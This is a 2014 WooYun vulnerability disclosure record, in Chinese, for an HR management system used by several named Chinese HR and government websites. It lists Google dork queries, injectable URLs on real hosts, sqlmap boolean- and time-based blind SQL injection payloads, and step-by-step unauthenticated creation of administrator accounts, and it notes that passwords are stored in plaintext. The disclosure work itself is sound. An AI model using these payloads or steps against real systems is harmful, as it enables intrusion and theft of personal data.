{"id": 53160, "wybug_id": "wooyun-2014-068614", "wybug_title": "某人力资源系统多处SQL注射/目录遍历/越权访问添加管理员（用户密码明文存储）", "wybug_corp": "cncert国家互联网应急中心", "wybug_author": "魇", "wybug_date": "2014-07-17 16:46", "wybug_open_date": "2014-10-15 16:50", "wybug_type": "设计缺陷/逻辑错误", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "已交由第三方合作机构(cncert国家互联网应急中心)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["设计不当导致攻击界面扩大"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-07-17：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-07-22：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-07-25：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2014-09-15：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-09-25：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-10-05：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-10-15：\t细节向公众公开  简要描述： 感觉通用的洞都是后娘生的..提交了要等审核，漫长的审核后还要纠结是否前台.. 详细说明：   WooYun: 某人力资源系统任意文件下载(多家人力资源网存在问题)  有人提交过了cncert国家互联网应急中心确认厂商为浙江天正思维信息技术有限公司（www.zjtzsw.com）\n注入点#1: google搜索 CompanyAction.do?userid影响案例：http://www.dqlm.com/CompanyAction.do?method=getpersoninfo&userid=P9797&psempid=P9797http://www.lhrlzyw.com/CompanyAction.do?method=getpersoninfo&userid=P16472&psempid=P16472http://220.176.122.18:9090/CompanyAction.do?method=getpersoninfo&userid=P3648&psempid=P3648http://www.lhjy.gov.cn/CompanyAction.do?method=getpersoninfo&userid=P14134&psempid=P14134http://www.zjdeqing.lm.gov.cn/CompanyAction.do?method=getpersoninfo&userid=P7794&psempid=P7794\n\n注入点#2: google搜索 PostInfoAction.do?postid影响案例：http://www.lhjy.gov.cn/PostInfoAction.do?method=TOPPostInfo&postid=6040101http://www.dqlm.com/PostInfoAction.do?method=TOPPostInfo&postid=6040101http://www.zjdeqing.lm.gov.cn/PostInfoAction.do?method=TOPPostInfo&postid=2021400http://www.fzjob.net:9090/PostInfoAction.do?method=TOPPostInfo&postid=1050107http://www.lhrlzyw.com/PostInfoAction.do?method=TOPPostInfo&postid=6040101http://220.176.122.18:9090/PostInfoAction.do?method=TOPPostInfo&postid=6040101\n\n注入点#3: google搜索 PersonUserAction.do?cmpid影响案例：http://www.dqlm.com//PersonUserAction.do?method=getcompanyInfo&postid=8229&cmpid=C2839http://www.lhrlzyw.com/PersonUserAction.do?method=getcompanyInfo&postid=2739&cmpid=C1146http://www.zjdeqing.lm.gov.cn/PersonUserAction.do?method=getcompanyInfo&postid=7613&cmpid=C2971http://www.fzjob.net:9090/PersonUserAction.do?method=getcompanyInfo&postid=2702&cmpid=C1681http://220.176.122.18:9090/PersonUserAction.do?method=getcompanyInfo&postid=2781&cmpid=C2402\n\n注入点#4: google搜索 PersonAction.do?applyid影响案例：http://www.dqlm.com//PersonAction.do?method=TOPlistPerson&applyid=0003020http://www.fzjob.net:9090/PersonAction.do?method=TOPlistPerson&applyid=0003020http://www.lhrlzyw.com/PersonAction.do?method=TOPlistPerson&applyid=0003020http://www.zjdeqing.lm.gov.cn/PersonAction.do?method=TOPlistPerson&applyid=0003020http://220.176.122.18:9090/PersonAction.do?method=TOPlistPerson&applyid=0003020http://www.lhjy.gov.cn/PersonAction.do?method=TOPlistPerson&applyid=0003020\n以www.dqlm.com（德清人力资源网）示例一个：\n---Place: GETParameter: userid    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: method=getpersoninfo&userid=P9798' AND 9467=9467 AND 'dFZb'='dFZb&psempid=P9798    Type: AND/OR time-based blind    Title: Oracle AND time-based blind    Payload: method=getpersoninfo&userid=P9798' AND 2132=DBMS_PIPE.RECEIVE_MESSAGE(CHR(80)||CHR(73)||CHR(99)||CHR(87),5) AND 'uPlj'='uPlj&psempid=P9798---[15:53:30] [INFO] the back-end DBMS is Oracleweb application technology: JSPback-end DBMS: Oracle\n\navailable databases [21]:[*] CTXSYS[*] DBSNMP[*] DMSYS[*] DQWEB[*] EXFSYS[*] HR[*] IX[*] MDSYS[*] OE[*] OLAPSYS[*] ORDSYS[*] OUTLN[*] PM[*] SCOTT[*] SH[*] SYS[*] SYSMAN[*] SYSTEM[*] TSMSYS[*] WMSYS[*] XDB\n密码明文存储，随便跑了几个测试下登录\n\n\n\n   漏洞证明：  多处目录遍历：\n/include//company//news//images//upload/admin/edit//reg//admin/images//FCKeditor//admin/user/\n主要说说/admin/user/目录，该目录未授权访问，可以随意添加内部用户，赋予管理员权限如：http://www.dqlm.com/admin/user/http://www.lhrlzyw.com/admin/user/http://www.lhjy.gov.cn/admin/user/http://www.zjdeqing.lm.gov.cn/admin/user/http://www.fzjob.net:9090/admin/user/http://220.176.122.18:9090/admin/user/（可以自己访问一下验证通用性）\n\n目录下访问addnew.jsp可添加内部用户，然后访问select.jsp可变更用户赋权lhjy.gov.cn (临海市人力资源网)为例：\n\n\n\n访问http://www.lhjy.gov.cn/admin/user/select.jsp 点击查询，就可以看见刚才添加的用户（也可以删除，修改，权限分配其他用户）\n\n\n\n全部勾选保存后我们再来登录刚才添加的帐号看看 （默认的后台登录页面为www.lhjy.gov.cn/admin/）\n\n\n\n\n\n\n\n 包括身份证，姓名，联系方式等大量个人以及单位用户敏感信息，而且是明文密码   修复方案：  可以脱裤了都，尽快处理通报涉及网站，这系统问题很多。   版权声明：转载请注明来源 魇@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：15  确认时间：2014-07-22 14:45 厂商回复： CNVD仍未建立与软件生产厂商的处置渠道，按上次漏洞处置流程，转由CNCERT下发给山东和浙江分中心处置相关政府上案例。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 15, "Ranks": null}